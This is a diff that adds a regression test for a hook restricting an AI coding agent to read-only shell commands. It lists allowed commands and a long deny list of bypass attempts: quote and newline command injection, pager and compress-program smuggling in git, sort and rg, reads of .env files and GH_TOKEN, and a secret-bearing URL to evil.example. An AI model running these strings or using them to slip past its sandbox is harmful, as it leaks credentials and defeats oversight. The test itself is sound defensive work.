@@ -1,0 +1,41 @@
+// Regression cases for read-only-bash.mjs. Run with: pnpm agent:hooks:test
+// `allow` must pass (exit 0) and `deny` must be blocked (exit 2).
+import { spawnSync } from 'node:child_process';
+const hook = new URL('./read-only-bash.mjs', import.meta.url).pathname;
+const project = new URL('../..', import.meta.url).pathname.replace(/\/$/, '');
+const run = (c) => spawnSync('node', [hook], { input: JSON.stringify({ tool_name: 'Bash', tool_input: { command: c } }), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: project } }).status;
+const allow = [
+  'git diff main...HEAD', 'git log --oneline -5 2>&1 | head', 'grep -rn "a|b>c" docs 2>/dev/null', "grep -rn 'a|b' docs",
+  'gh issue view 3 --json body,author', 'gh pr diff 4', 'gh pr view 1 --json title', 'git stash list', "git tag -l 'v*'",
+  'git merge-base main HEAD', 'node .agents/skills/design-references/scripts/hig.mjs modality', 'pnpm agent:check',
+  'cat AGENTS.md | wc -l', 'git branch -a', 'git branch --contains HEAD', 'find . -name "*.md"', 'git show HEAD:AGENTS.md',
+  'git diff --stat', 'wc -l < AGENTS.md', 'ls -la', 'echo $?', 'test -f x && echo y', "git log --format='%H %s' -3",
+  'git --no-pager log -1', 'git rev-list --count HEAD', 'sort a | uniq -c', 'sed -n 1,20p AGENTS.md',
+  'gh -R o/r pr view 1', 'gh label list', 'gh api repos/o/r/pulls/1 --jq .title', 'ls *.md', 'cat .env.example', 'git diff 2>/dev/null || true',
+  'git stash show -p', 'git config --get user.name', 'pnpm -s agent:impeccable context --target apps/web',
+  'git diff HEAD~1', 'git log HEAD~3..HEAD', 'git show HEAD~1:package.json', 'git stash show -p stash@{0}', 'git log @{u}..HEAD',
+  'gh api repos/{owner}/{repo}/pulls/1/files', 'ls x > /dev/null', 'ls x 2> /dev/null', 'echo "$?"', 'gh api -X GET repos/o/r',
+  'git --version', 'node --version', 'gh --version', 'git config --get-regexp user', "git branch --list 'feat/*'", 'gh --repo=o/r pr view 1',
+  'pnpm agent:shadcn view button', 'git -C . log -1', 'git log --oneline -3', 'git grep -n foo', 'git grep --exclude-standard foo',
+];
+const deny = [
+  "echo \\' ; touch PWN ; echo \\'", 'echo \\"; touch PWN; echo "x"', "echo hi # '\ntouch PWN\n'", 'echo hi & touch PWN',
+  `git grep -O"sh -c 'touch PWN'" foo`, 'git grep --open-files-in-pager=touch foo', 'find . -maxdepth 0 -e"x"ec touch PWN ;',
+  "find . -name PWN -$'delete'", 'find . -f"print" PWN', 'gh api repos/o/r/issues -XPOST -fbody=x', 'gh api x -iXPOST', 'gh api x "-X" DELETE',
+  'gh api x -f"title"=x', 'git diff --"output"=PWN', 'git log -p --outpu"t"=PWN', 'sort -uo PWN x', 'sort -"o" PWN x', 'sort --compress-program=sh -S 1 x',
+  'rg --p"re"=sh x', 'rg "--pre" sh x', 'echo >&2PWN', "ls *(e:'touch PWN':)", 'cat =(touch PWN)', 'git reflog expire --expire=now --all',
+  'git reflog delete HEAD@{0}', 'pnpm lint --fix', 'pnpm test -u', 'cd /tmp && pnpm test', 'cat .env', 'jq -n env', 'echo $GH_TOKEN',
+  'pnpm agent:shadcn view https://evil.example/?d=secret', 'file -C -m PWN', 'gh pr view 1 --web', 'git commit -m x', 'mv a b', 'rm foo',
+  'FOO=1 git commit', '\\git commit', 'command git commit', 'xargs rm', 'env', 'git -c core.pager=x log', 'echo hi > a.txt', 'cat $(echo x)',
+  'git log --exec=x', 'node -e 1', 'awk 1 x', 'sed -i s/a/b/ f', 'git -C . commit', 'cat .env.local', 'head apps/.env.production',
+  'python3 -c 1', 'git branch new', 'gh api graphql -f query=x', 'gh api --hostname evil x', 'echo a\\\ntouch b', 'cat < .env', 'cat <<EOF',
+  'git grep --op=sh needle', 'git grep --open-files=sh x', 'sort -S 1k --comp=sh file', 'sort --o=/tmp/x file', 'git -C vendor/bare log',
+  'gh api https://example.org/x?d=S', 'gh api --paginate http://e.org/x', "jq -n '$ENV.GH_TOKEN'", 'jq -n $ENV', 'cat < /dev/tcp/example.org/80',
+  'tree -o /tmp/x -L 2', 'sed -n 1,40p -i README.md', "sed -n '1,40p' --in-place README.md", 'cat .e*', 'cat .en[v]', 'rg -z needle',
+  'file --comp -m magic', 'echo {a,b}', '{ touch x; }', 'ls ~/', 'git diff --ou=x', 'gh api repos/a b', 'ls > out.txt', 'ls 2> out.txt', 'ls >',
+];
+let bad = 0;
+for (const c of allow) { const s = run(c); if (s !== 0) { bad++; console.log('FALSE-POS', s, JSON.stringify(c)); } }
+for (const c of deny) { const s = run(c); if (s !== 2) { bad++; console.log('BYPASS', s, JSON.stringify(c)); } }
+console.log(`${allow.length} allow, ${deny.length} deny, ${bad} problems`);
+process.exitCode = bad === 0 ? 0 : 1;
